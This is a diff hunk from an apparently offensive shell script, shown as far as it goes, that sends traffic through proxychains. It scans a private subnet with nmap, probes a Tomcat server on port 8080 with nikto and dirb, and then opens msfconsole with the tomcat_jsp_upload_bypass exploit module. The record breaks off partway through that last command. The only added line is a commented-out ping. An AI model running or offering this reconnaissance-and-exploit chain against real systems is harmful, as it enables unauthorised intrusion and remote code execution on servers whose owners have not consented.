@@ -1,4 +1,5 @@
 proxychains4 -q nmap -sS -Pn -n -T4 --open -p22,80,443,8080 192.168.1.100/24 -oN /tmp/scan.log
+#ping 8.8.8.8
 proxychains4 -q nikto -h http://192.168.1.137:8080 -output /tmp/nikto_scan.html
 proxychains4 -q dirb http://192.168.1.137:8080 /usr/share/dirb/wordlists/common.txt -o /tmp/dirb.log
 msfconsole -q -x "use exploit/multi/http/tomcat_jsp_upload_bypass;
